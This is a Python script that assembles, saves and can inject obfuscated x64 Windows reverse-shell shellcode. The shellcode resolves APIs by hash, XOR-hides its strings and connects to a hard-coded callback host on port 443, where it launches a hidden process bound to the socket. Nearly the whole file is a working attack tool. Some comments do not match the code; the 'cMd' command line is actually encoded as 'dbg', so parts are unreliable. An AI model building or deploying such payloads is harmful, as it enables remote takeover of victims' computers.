from keystone import *
from ctypes import *
import numpy, os, struct, subprocess, sys, time

LHOST = "10.143.56.98"
LPORT = 443
DEBUG = False
INJECT = False
SAVE = True
CHECK_BADCHARS = True
BADCHARS = [0x00]
SHELLCODE_FILE = r"C:\Users\user\Desktop\revshell.bin"
WINDBG = r"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe"

def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return int(binb, 2)

def set_function_hash(name, key=0xf):
    rdx = 0
    ror_count = 0
    for rax in name:
        rdx = rdx + ord(rax)
        if ror_count < len(name) - 1:
            rdx = ror_str(rdx, key)
        ror_count += 1
    return f"mov r14d, {hex(rdx)}"

def to_hex(s):
    r = [hex(ord(c)) for c in s]
    return "".join(r).replace("0x", "")

def reverse_hex_string(s):
    ba = bytearray.fromhex(s)
    ba.reverse()
    return ba.hex()

def push_string(s):
    reversed_hex = reverse_hex_string(to_hex(s))
    chunks = []
    while len(reversed_hex) > 0:
        chunk = reversed_hex[-16:]
        if len(chunk) < 16:
            chunk = chunk.rjust(16, "f")
        chunks.append(chunk)
        reversed_hex = reversed_hex[:-16]

    if len(s) % 8 == 0:
        chunks.append("ffffffffffffffff")

    chunks.reverse()
    instrs = [f"mov rax, 0x{c}; push rax" for c in chunks]
    instrs.append(f"xor byte ptr [rsp+{hex(len(s))}], 0xff")

    return ';'.join(instrs)

def set_ip(ip):
    a = [format(int(octet), "02x") for octet in ip.split(".")]
    a.reverse()
    return "mov eax, 0x" + "".join(a)

def set_port(p):
    if p > 255:
        a = [format(int(octet), "02x") for octet in struct.pack("<h", p)]
        return f"mov dx, 0x{''.join(a)}; shl rdx, 0x10"
    else:
        return f"mov dl, 0x{format(int(p), '02x')}; shl rdx, 0x18"

kernel32 = windll.kernel32
kernel32.VirtualAlloc.restype = c_void_p
kernel32.RtlCopyMemory.argtypes = (c_void_p, c_void_p, c_size_t)
kernel32.CreateThread.argtypes = (c_int, c_int, c_void_p, c_int, c_int, c_void_p)

# [rbp+0x08]  - find_function
# [rbp+0x10]  - LoadLibraryA
# [rbp+0x20]  - CreateProcessA
# [rbp+0x28]  - string scratch space
# [rbp+0x30]  - WSAStartup
# [rbp+0x38]  - WSASocketA
# [rbp+0x40]  - connect
# [rbp+0x48]  - RtlExitUserThread
# [rbp+0x80]  - sockaddr struct (16 bytes)
# [rbp+0x90]  - lpCommandLine ("cMd") (16 bytes)
# [rbp+0xa0]  - STARTUPINFOA struct (104 bytes)
# [rbp+0x108] - PROCESS_INFORMATION struct (24 bytes)

SHELLCODE = f"""
start:
    nop
    nop
    nop
    nop
    mov   r12, 0x5858585858585858               # arbitrary xor key to obfuscate
    mov   rbp, rsp                              # save rsp
    xor   eax, eax                              # zero rax
    mov   ax, 0x201                             # 0x201 into rax
    dec   rax                                   # fix 0x201->0x200
    sub   rsp, rax                              # make some room on the stack
    and   rsp, 0xfffffffffffffff0               # 16-byte align

find_kernel32:
    xor   eax, eax                              # zero rax
    mov   r10, gs:[rax+0x60]                    # PEB into r10
                                                #   > dt _PEB @r10
    mov   r10, qword ptr [r10+0x18]             # deref PEB->Ldr into r10
                                                #   > dt _PEB_LDR_DATA @r10
    mov   r10, qword ptr [r10+0x10]             # deref PEB->Ldr.InLoadOrderLinks into r10
                                                #   > dt _LDR_DATA_TABLE_ENTRY @r10
    mov   r13, 0x5816580a581d5813               # "NREK" ^ r12
    mov   r14, 0x586a586b5814581d               # "23LE" ^ r12
    xor   r13, r12                              # deobfuscate
    xor   r14, r12                              # deobfuscate
    sub   r10, 0x8                              # prep for add r10 below

next_module:
    add   r10, 0x8                              # next LDR_DATA_TABLE_ENTRY
    mov   r10, qword ptr [r10]                  # deref InLoadOrderLinks
    mov   r11, qword ptr [r10+0x30]             # DllBase
    mov   rsi, qword ptr [r10+0x60]             # BaseDllName.Buffer (UNICODE_STRING)
    test  rsi, rsi                              # check for null ptr
    jz    next_module                           # null string? try next module
    lodsq                                       # load 8 bytes into rax (4 chars + 4 nulls)
    cmp   rax, r13                              # compare with "NREK"
    jne   next_module                           # no match, next module
    lodsq                                       # load the next 8 bytes into rax
    cmp   rax, r14                              # compare with "23LE"
    jne   next_module                           # no match, try next module

# kernel32.dll base is now in r11

find_function_shorten:
    jmp   find_function_bnc                     # short jump

find_function_ret:
    pop   rsi                                   # pop the return address from the stack
    mov   qword ptr [rbp+0x8], rsi              # save find_function address for later usage
    jmp   resolve_symbols_kernel32              # start resolving kernel32 functions

find_function_bnc:
    call  find_function_ret                     # relative call with negative offset

# r11 - base address of module to search
# r14d - function hash
# function address returned in rax
find_function:
    xor   ecx, ecx                              # zero rcx
    mov   eax, dword ptr [r11+0x3c]             # NT headers RVA
    add   rax, r11                              # NT headers VMA
    mov   cl, 0x88                              # 0x88 into rcx
    mov   eax, dword ptr [rax+rcx]              # Export Address Table
    add   rax, r11                              # EAT in rax
    mov   r15, rax                              # save EAT in r15
    mov   ecx, dword ptr [rax+0x18]             # NumberOfNames
    mov   eax, dword ptr [rax+0x20]             # AddressOfNames RVA
    add   rax, r11                              # AddressOfNames VMA
    mov   r9, rax                               # save AddressOfNames VMA

find_function_loop:
    jrcxz find_function_finished                # finish if counter is zero
    dec   rcx                                   # decrease counter
    mov   rax, r9                               # restore AddressOfNames VMA
    mov   esi, dword ptr [rax+rcx*4]            # RVA of symbol name
    add   rsi, r11                              # VMA of symbol name

compute_hash:
    xor   eax, eax                              # zero eax
    cdq                                         # zero edx
    cld                                         # clear direction flag

compute_hash_again:
    lodsb                                       # load the next byte from esi into al
    test  al, al                                # check for null terminator
    jz    compute_hash_finished
    ror   edx, 0x0f                             # rotate edx 15 bits to the right
    add   edx, eax                              # add the new byte to the accumulator
    jmp   compute_hash_again                    # next iteration

compute_hash_finished:

find_function_compare:
    cmp   edx, r14d                             # compare hashes
    jne   find_function_loop                    # no match? try next function
    mov   edx, dword ptr [r15+0x24]             # AddressOfNameOrdinals RVA
    add   rdx, r11                              # AddressOfNameOrdinals VMA
    mov   cx, word ptr [rdx+2*rcx]              # get the function's ordinal
    mov   edx, dword ptr [r15+0x1c]             # AddressOfFunctions RVA
    add   rdx, r11                              # AddressOfFunctions VMA
    mov   eax, dword ptr [rdx+4*rcx]            # get the function RVA
    add   rax, r11                              # get the function VMA

find_function_finished:    
    ret                                         # return

zero_registers:
    xor   ecx, ecx                              # zero rcx
    xor   edx, edx                              # zero rdx
    xor   r8d, r8d                              # zero r8
    xor   r9d, r9d                              # zero r9
    ret                                         # return

resolve_symbols_kernel32:
    {set_function_hash("LoadLibraryA")}         # put LoadLibraryA hash in r14d
    call  qword ptr [rbp+0x08]                  # call find_function
    mov   qword ptr [rbp+0x10], rax             # save LoadLibraryA address in [rbp+0x10]
    {set_function_hash("CreateProcessA")}       # put CreateProcessA hash in r14d
    call  qword ptr [rbp+0x08]                  # call find_function
    mov   qword ptr [rbp+0x20], rax             # save CreateProcessA address in [rbp+0x20]

load_ws2_32:
    mov   rax, 0x58586a6b076a2b2f               # xor'd "ws2_32" into rax
    xor   rax, r12                              # decrypt with xor key
    mov   qword ptr [rbp+0x28], rax             # write rax to scratch space
    lea   rcx, qword ptr [rbp+0x28]             # load "ws2_32" from scratch space
    call  qword ptr [rbp+0x10]                  # call LoadLibraryA

resolve_symbols_ws2_32:
    mov   r11, rax                              # put base address of ws2_32.dll into r11
    {set_function_hash("WSAStartup")}           # put WSAStartup hash in r14d
    call  qword ptr [rbp+0x08]                  # call find_function
    mov   qword ptr [rbp+0x30], rax             # save WSAStartup address in [rbp+0x30]
    {set_function_hash("WSASocketA")}           # put WSASocketA hash in r14d
    call  qword ptr [rbp+0x08]                  # call find_function
    mov   qword ptr [rbp+0x38], rax             # save WSASocketA address in [rbp+0x38]
    {set_function_hash("connect")}              # put connect hash in r14d
    call  qword ptr [rbp+0x08]                  # call find_function
    mov   qword ptr [rbp+0x40], rax             # save connect address in [rbp+0x40]

load_ntdll:
    mov   rax, 0x58585834343c2c36               # xor'd "ntdll" into rax
    xor   rax, r12                              # decrypt with xor key
    mov   qword ptr [rbp+0x28], rax             # write rax to scratch space
    lea   rcx, qword ptr [rbp+0x28]             # load "ws2_32" from scratch space
    call  qword ptr [rbp+0x10]                  # call LoadLibraryA

resolve_symbols_ntdll:
    mov   r11, rax                              # put base address of ntdll.dll into r11
    {set_function_hash("RtlExitUserThread")}    # put RtlExitUserThread hash in r14d
    call  qword ptr [rbp+0x08]                  # call find_function
    mov   qword ptr [rbp+0x48], rax             # save RtlExitUserThread address in [rbp+0x48]

# WSAStartup(0x202, &wsadata);
call_wsastartup:
    xor   ecx, ecx                              # zero rcx
    mov   cx, 0x202                             # set rcx to 0x202
    mov   rdx, rsp                              # set rdx to current stack pointer
    call  qword ptr [rbp+0x30]                  # call WSAStartup

# WSASocketA(2, 1, 0, NULL, 0, 0);
call_wsasocketa:
    call  zero_registers                        # zero registers (r9 = lpProtocolInfo (0))
    mov   dl, 0x1                               # SOCK_STREAM (1)
    mov   cl, 0x2                               # AF_INET (2)
    mov   dword ptr [rsp+0x28], r9d             # dwFlags (0)
    mov   dword ptr [rsp+0x20], r9d             # group (0)
    call  qword ptr [rbp+0x38]                  # call WSASocketA
    mov   r15, rax                              # put socket in r15

# connect(sock, &sockaddr, sizeof(sockaddr));
call_connect:
    {set_ip(LHOST)}                             # put callback IP in eax
    shl   rax, 0x20                             # shift rax 4 bytes left
    {set_port(LPORT)}                           # put callback port in rdx and shift
    add   dx, 0x2                               # put 0x2 in dx
    add   rax, rdx                              # add rcx to rax
    mov   rdx, rbp                              # rbp into rdx
    xor   ecx, ecx                              # zero rcx
    mov   cl, 0x80                              # 0x80 into cl
    add   rdx, rcx                              # add rcx to rdx
    mov   qword ptr [rdx], rax                  # write sockaddr struct to scratch space
    mov   rcx, r15                              # put socket in rcx
    mov   r8b, 0x10                             # sizeof(sockaddr) in r8b
    call  qword ptr [rbp+0x40]                  # call connect

create_startupinfoa:
    xor   r9d, r9d                              # zero r9
    mov   r9b, 0xa0                             # 0xa0 into r9
    mov   rax, rbp                              # rbp into rax
    add   rax, r9                               # add r9 to rax
    xor   ecx, ecx                              # zero rcx
    mov   cl, 0x68                              # sizeof(STARTUPINFOA)
    mov   dword ptr [rax], ecx                  # si.cb = 0x68
    add   cl, 0x97                              # add 0x97 to 0x68 to get 0xff
    inc   ecx                                   # inc ecx to 0x100
    mov   dword ptr [rax+0x3c], ecx             # si.dwFlags = 0x100
    mov   qword ptr [rax+0x50], r15             # si.hStdInput = r15
    mov   qword ptr [rax+0x58], r15             # si.hStdOutput = r15
    mov   qword ptr [rax+0x60], r15             # si.hStdError = r15
    mov   r14, rax                              # move buffer to r14

# CreateProcessA(NULL, (LPSTR)"cMd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
call_createprocessa:
    mov   dx, 0x108                             # 0x108 into rdx
    mov   rax, rbp                              # rbp into rax
    add   rax, rdx                              # add rdx to rbp
    push  rdx                                   # save rdx
    call  zero_registers                        # zero registers
    pop   rdx                                   # restore rdx
    mov   r11d, 0x7ffffff                       # 0x7ffffff into r11
    inc   r11                                   # fix 0x7ffffff->0x8000000
    mov   qword ptr [rsp+0x48], rax             # lpProcessInformation
    mov   qword ptr [rsp+0x40], r14             # lpStartupInfo
    mov   qword ptr [rsp+0x38], rcx             # lpCurrentDirectory (NULL)
    mov   qword ptr [rsp+0x30], rcx             # lpEnvironment (NULL)
    mov   qword ptr [rsp+0x28], r11             # dwCreationFlags (CREATE_NO_WINDOW)
    inc   qword ptr [rsp+0x20]                  # bInheritHandles (TRUE)
    mov   r11d, 0x676264ff                      # "dbg" into r11
    shr   r11, 0x8                              # fix r11
    sub   dx, 0x78                              # subtract 0x78 from rdx to get 0x90
    add   rdx, rbp                              # add rbp to rdx
    mov   qword ptr [rdx], r11                  # write r11 to scratch space
    call  qword ptr [rbp+0x20]                  # call CreateProcess
    
# RtlExitUserThread(0);
call_rtlexituserthread:
    xor   ecx, ecx                              # zero rcx
    call  qword ptr [rbp+0x48]                  # call RtlExitUserThread
"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
shellcode = b""

for i, byte in enumerate(ks.asm(SHELLCODE)[0]):
    if CHECK_BADCHARS:
        if byte in BADCHARS:
            raise Exception(f"Bad character {hex(byte)} at {i}")
    shellcode += struct.pack("B", byte)

print(f"Shellcode size: {len(shellcode)}")

if SAVE:
    with open(SHELLCODE_FILE, "wb") as f:
        f.write(bytearray(shellcode))

if INJECT or DEBUG:
    if DEBUG:
        subprocess.Popen([WINDBG, "-g", "-p", str(os.getpid())], shell=True)
        time.sleep(2)

    buf = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    kernel32.RtlCopyMemory(c_void_p(buf), shellcode, len(shellcode))
    handle = kernel32.CreateThread(0, 0, c_void_p(buf), 0, 0, c_void_p(0))
    kernel32.WaitForSingleObject(handle, -1)
